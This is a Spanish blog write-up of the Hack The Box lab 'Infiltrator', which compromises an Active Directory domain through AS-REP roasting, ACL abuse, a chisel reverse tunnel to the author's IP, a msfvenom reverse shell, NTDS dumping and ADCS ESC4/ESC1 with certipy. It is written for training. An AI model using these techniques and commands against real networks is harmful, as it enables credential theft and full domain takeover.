---
title: "Infiltrator [INSANE]"
date: 17-06-2025 00:00:00 +0800
categories: [HTB, Active Directory, Insane]
tags: [HTB, Active Directory, Insane]
author: 0xB3L14L
description: Máquina centrada en ataques de Active Directory, port forwarding, y enumeración de una aplicación de mensajería.
lang: es
permalink: /posts/Infiltrator
image:
  path: /Media/Images/Infiltrator/Infiltrator.webp
---

Para poder resolver está máquina, es recomendado tener un windows.

## Enumeración Inicial

### Escaneo NMAP

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Infiltrator.htb
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-11 21:38:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2025-06-11T21:42:32+00:00; -3d07h15m12s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2025-06-11T21:42:30+00:00; -3d07h15m12s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-11T21:42:31+00:00; -3d07h15m12s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-11T21:42:30+00:00; -3d07h15m12s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc01.infiltrator.htb
| Not valid before: 2025-06-03T14:17:24
|_Not valid after:  2025-12-03T14:17:24
|_ssl-date: 2025-06-11T21:42:30+00:00; -3d07h15m12s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INFILTRATOR
|   NetBIOS_Domain_Name: INFILTRATOR
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: infiltrator.htb
|   DNS_Computer_Name: dc01.infiltrator.htb
|   DNS_Tree_Name: infiltrator.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-11T21:41:31+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
15220/tcp open  unknown
15223/tcp open  unknown
15230/tcp open  unknown
49666/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
49878/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:window
```
De todos puertos los puertos, hay algunos que llaman la atención:
- 80 (Sitio Web)
- 3389 (Conexión RDP disponible)
- 15220, 15223, 15230 (Puertos no comunes en un entorno AD)

### Sitio Web
Se intentó enumeración directorios, y subdominios pero no hubo resultado.
![Website](/Media/Images/Infiltrator/website.png)
Pero dentro de la página principal, hay una sección llamada **Digital Team** con varios nombres de personas. Estos podrían ser los usuarios que pertenecen al dominio Infiltrator. Entonces se copia sus nombres, son 7 en total.

### Crear una lista de usuarios - UsernameAnarchy
La herramienta username anarchy sirve para la creación de nombre de usuarios.

![Username-anarchy](/Media/Images/Infiltrator/anarchy.png)

Ya con la lista, se debe probar cuáles son los usernames válidos.

## Kerbrute - Encontrar usuarios válidos
Con kerbrute se puede enumerar las cuentas de usuarios válidas a través de la pre autenticación de Kerberos, lo hace comparando el mensaje de error que envía el KDC.
![Kerbrute](/Media/Images/Infiltrator/kerbrute.png)

Listo, se tiene las cuentas de usuarios. Al no tener credenciales, se puede intentar si existen usuarios **ASREProastables**

## ASREP Roasting

![asrep](/Media/Images/Infiltrator/asrep.png)

Y se encontró uno: **l.clark**

Se lo puede crackear con hashcat.

![hashcat](/Media/Images/Infiltrator/hashcat.png)

Su contraseña es: **WAT?watismypass!**

## Password Spray
Se enumeró con el usuario **l.clark** sin éxito. Asi que se puede probar hacer un password spray para ver existe otro usuario con la misma contraseña. PERO HAY UN INCOVENIENTE.
![Protected-Users](/Media/Images/Infiltrator/protected-users.png)
Tanto **d.anderson** como **m.harris** son [usuarios protegidos](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)

Se limita la autenticación, pero no es un gran problema. Se puede ver si es válida la contraseña utilizando kerbrute nuevamente.
![kerbrute2](/Media/Images/Infiltrator/kerbrute2.png)

El usuario **d.anderson** utiliza la misma contraseña.

## TGT - d.anderson (Protected User)
Para evitar problemas, y poder autenticarse como **d.anderson** se solicita su TGT.
![anderson-tgt](/Media/Images/Infiltrator/tgt.png)
Se lo exporta como variable de entorno.
![anderson-ccache](/Media/Images/Infiltrator/anderson-ccache.png)
Y se configura el realm en **/etc/krb5.conf**. (Sera útil en el futuro)
```bash
[domain_realm]
    .infiltrator.htb = INFILTRATOR.HTB
    infiltrator.htb = INFILTRATOR.HTB

[libdefaults]
    default_realm = INFILTRATOR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    forwardable = true

[realms]
    INFILTRATOR.HTB = {
        kdc = DC01.INFILTRATOR.HTB
        admin_server = DC01.INFILTRATOR.HTB
        default_domain = INFILTRATOR.HTB
    }
```
Listo, ya se puede enumerar con este usuario. Primero con **bloodhound**.

## ACL Abuse - GenerciAll sobre OU
El usuario **d.anderson** tiene el ACE GenericAll sobre un OU. Y dentro de este, hay un usuario.
![GenericAll](/Media/Images/Infiltrator/genericall.png)
Para explotarlo, se puede hacer que todos los objectos pertenecientes al OU heredén el ACE de **d.anderson**. 
![inheritance](/Media/Images/Infiltrator/inheritance.png)
Bien, ahora se puede decir que **d.anderson** tiene el ACE GenericAll sobre el usuario **e.rodriguez**. De entre todos los ataques disponibles, el más fácil es cambiarle la contraseña.
![PasswordChange](/Media/Images/Infiltrator/password.png)

## ACL Abuse - AddSelf
**E.rodriguez** se puede agregar al grupo **CHIEF MARKETING**.
![AddSelf](/Media/Images/Infiltrator/addself.png)
Se lo puede hacer con **bloodyAD**
![BloodyAD-Add](/Media/Images/Infiltrator/bloodyadd.png)

## ACL Abuse - ForceChangePassword
Este grupo tiene el ACE **ForceChangePassword** sobre el usuario m.harris
![Password2](/Media/Images/Infiltrator/password2.png)

Entónces, se cambia la contraseña.

![change](/Media/Images/Infiltrator/change.png)

Recordandó que **m.harris** también pertenece al grupo **Protected Users**, se consigue su TGT.

![tgt2](/Media/Images/Infiltrator/tgt2.png)

Con este usuario se puede acceder con evil-winrm, y conseguir la **user flag**.

# Root

Aquí es donde se complica la máquina, no tanto en la explotación de ataques, sino en la enumeración de una aplicación de mensajería.

## Enumeración Interna - OutputMessenger
Enumerando usuarios, se encunetra lo siguiente.

![turner-pass](/Media/Images/Infiltrator/tuner-pass.png)

Unas posibles credenciales, pero al probar con el usuario **k.turner** no funcionaron. Al seguir enumerando, se encuentra varios puertos abiertos internamente.

![ports](/Media/Images/Infiltrator/internal-ports.png)

Y al parecer tienen que ver con los puertos que se encontraron al comienzo del escaneo. Buscando por el PID para encontrar el proceso responsable, muestra:

![process](/Media/Images/Infiltrator/process.png)

Son de un programa llamado [**OutputMessenger**](https://www.outputmessenger.com/). Un programa de mensajería.

La creds de **k.turner** pueden ser para iniciar sesión a este programa. Así que, tengo que conseguir acceso por medio de un port-forwarding.

## Port-Forwarding
Lo hice con chisel.
```powershell
.\chisel_windows.exe client 10.10.14.107:8000 R:14118:127.0.0.1:14118 R:14119:127.0.0.1:14119 R:14121:127.0.0.1:14121 R:14122:127.0.0.1:14122 R:14123:127.0.0.1:14123 R:14124:127.0.0.1:14124 R:14125:127.0.0.1:14125 R:14126:127.0.0.1:14126 R:14127:127.0.0.1:14127 R:14128:127.0.0.1:14128 R:14130:127.0.0.1:14130 R:14406:127.0.0.1:14406
```
Y desde un windows (Commando-VM) me conecto utilizando la IP de mi Kali, para ello me descargo la app versión cliente de OutputMessenger.

## Enumerar OutputMessenger como k.turner
Dentro muestra información de un programa que están desarrollando **UserExplorer**. 

En la sección Output Wall (Muestran Updates del programa) están presentes las credenciales del user m.harris: **D3v3l0p3r_Pass@1337!**
![Harris-pass](/Media/Images/Infiltrator/harris-pass.png)

## Enumerar OutputMessenger como m.harris
Este usuario parece ser el desarrollador del programa **UserExplorer**, tiene una conversación con el admin referente al programa.
![Harris-chat](/Media/Images/Infiltrator/harris-chat.png)

Se puede descargar el programa, al revisarlo indica que es un .Net y al descompilarlo con **Ilspy**. En la función **main**, se encuentra lo siguiente:
![Main](/Media/Images/Infiltrator/main.png)

La credenciales cifradas del usuario **winrm_svc**.

Buscando, aparece la función **DecryptString**.
![decrypt](/Media/Images/Infiltrator/decrypt.png)

## Dessencriptar AES
El proceso es primero Base64, y luego Aes. Asi que, se puede seguir haciendo esto hasta conseguir las creds en texto claro. Para ello se puede utilizar CyberChef.

![CyberChef](/Media/Images/Infiltrator/winrm-pass.png)

## Enumerar OutputMessenger como winrm_svc
Este usuario es de servicio, dado por su nombre, puede entrar con winrm. Ademas, dentro de OutputMessenger tiene una nota indicando una API KEY.
![note](/Media/Images/Infiltrator/note.png)

Y tiene una conversación con el usuario **o.martinez**, este usuario indica que compartió su contraseña en el grupo **Chiefs_Marketing_chat**.
![winrm-chat](/Media/Images/Infiltrator/winrm-chat.png)

La documentación explica que se puede extraer los logs de las conversaciones de los grupos, para ello se necesita el API KEY para la autenticación, y el roomkey del grupo.

Dentro del directorio **C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA** se encuentra un DB de sqlite3.
![om3](/Media/Images/Infiltrator/om3.png)

Al descargarlo, y ver los datos, se encuentra el roomkey.

![chatroom](/Media/Images/Infiltrator/chatroom.png)

Ahora se mira los logs del grupo.
```bash
curl -s 'http://127.0.0.1:14125/api/chatrooms/log?roomkey=20240220014618@conference.com&fromdate=2000/01/01&todate=2026/01/01' -H "API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG" | jq .
```

Y aparecen las credenciales de **o.martinez**.

![martinez-pass](/Media/Images/Infiltrator/martinez-pass.png)

## Enumeración como o.martinez
Las creds encontradas solo sirven para iniciar sesión en la aplicación, pero no tiene nada importante. 

La documentación del OutputMessenger indica, que en la sección **Calendar** se puede establecer eventos de distintas acciones, y la que más importa es la acción **Run Application**. Esta acción permite la ejecución de un programa.

Así que, se crea un ejecutable con msfvenom y se lo carga en el directorio **C:\Temp**. 
![revshell](/Media/Images/Infiltrator/revshell.png)

Y se lo especifica en el evento, en mi caso me daba error porque no lo encontraba.

Esto era porque lo buscaba en mi Windows, viendo el perfil del usuario muestra que tiene iniciado sesión en dos dispositivos: En el DC01 (Máquina), y en COMMANDO (Mi Windows).
![profile](/Media/Images/Infiltrator/profile.png)

Para evadir ese problema, también coloqué la reverse shell en mi windows, en la misma ruta (Tuvo que crear el directorio Temp). El programa no indica en que dispositivo busca el ejecutable, así que seguro intenta buscarlo en ambos, y así fue.

### Análisi de PCAP
Dentro como **o-martinez**, buscando en el mismo directorio en donde está la información del OutputMessenger hay un archivo pcap.

![pcap](/Media/Images/Infiltrator/pcap.png)

Al traerlo al kali y utilizar Wireshark, aparece la contraseña de **o.martinez**. Y este usuario puede entrar por RDP.
![rdp-pass](/Media/Images/Infiltrator/rdp-pass.png)

Siguiendo explorando el pcap, muestra un comprimido 7z de un backup de bitlocker. 
![wireshark](/Media/Images/Infiltrator/wireshark.png)

Se lo puede exportar del pcap.

![export](/Media/Images/Infiltrator/export.png)

Al intentar descomprimirlo pide una contraseña, asi que toca crackearlo.

![7z-pass](/Media/Images/Infiltrator/7z-pass.png)

### Crackeo de 7z
Se convierte el comprimido en un hash con john.

![7z2john](/Media/Images/Infiltrator/7z2john.png)

Y se lo crackea
![7z-cracked](/Media/Images/Infiltrator/7z-cracked.png)

La contraseña en **zipper**.

Se crea una carpeta y dentro hay un archivo **html**, se levanta un servidor http con python y se mira el html.
![recover](/Media/Images/Infiltrator/recover.png)

Aparece una clave de recuperación de BitLocker.

### BitLocker Drive
Este drive lo puede acceder el usuario **o.martinez** con rdp.
![drive](/Media/Images/Infiltrator/drive.png)

Dentro de los documentos del usuario Administrador, hay otro comprimido que según su nombre son credenciales.

![creds](/Media/Images/Infiltrator/creds.png)

Al traerlo al Kali y descomprimirlo, revela tres archivos: NTDS, SECURITY, y SYSTEM. Asi que con **secretsdump** se puede conseguir el contenido del NTDS para ver los hashes de los usuarios.
![secretsdump](/Media/Images/Infiltrator/secretsdump.png)

Lamentablemte ninguno funciona, esto es debido a que es un backup antiguo. 

Otra opción es enumerarlo como sqlite, para ver que mas información contiene. Se lo hace con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite/tree/main).

![tool](/Media/Images/Infiltrator/tool.png)

### Enumerar sqlite3 BD
Se encuentra distintas tablas, una de ellas es user_accounts.

![tables](/Media/Images/Infiltrator/tables.png)

Esta tabla tiene varias columnas.

![columns](/Media/Images/Infiltrator/columns.png)

Enumerándolas, se descubre que en la descripción del usuario **lan_managment** hay unas credenciales. Y al probarlas son válidas

![lan-pass](/Media/Images/Infiltrator/lan-pass.png)

## ACL Abuse -  ReadGMSAPassword
Enumerando nuevamente el entorno, el usuario **lan_managment** tiene el ACE ReadGMSAPassword sobre el usuario **infiltrator_svc**. 

![gmsa](/Media/Images/Infiltrator/gmsa.png)

Se lo explota y se consigue el NTHASH de ese usuario.

![hash](/Media/Images/Infiltrator/hash.png)

## ADCS Abuse - ESC4 
Como el usuario **infiltrator_svc** se puede ver si tiene una plantilla de certificado vulnerable.
```bash
certipy-ad find -u 'infiltrator_svc$@infiltrator.htb' -hashes ':653b2726881d6e5e9ae3690950f9bcc4' -dc-ip 10.10.11.31 -vulnerable -stdout
```

Tiene una, se llama **Infiltrator_Template** y es vulnerable a ESC4 (Template Hijacking). Esto permite al usuario modificar las configracione de la plantilla.

Para explotar este tipo, primero se modifica la plantilla para que tengan las configuraciones de una con estado vulnerable como por ejemplo ESC1. Se lo consigue con la opción **-write-default-configuration**.

![esc4](/Media/Images/Infiltrator/esc4.png)

Ahora es vulnerable a ESC1, permitiendo solicitar un certificado de un usuario privilegiado como el administrador. Para ello se debe colocar su UPN y SID.

![esc1](/Media/Images/Infiltrator/esc1.png)

Por último se autentica utilizando el certificado obtenido.

![auth](/Media/Images/Infiltrator/auth.png)

Esto dará acceso como el usuario administrador.

![admin](/Media/Images/Infiltrator/admin.png)

La máquina ya fue comprometida, y se puede leer la root flag.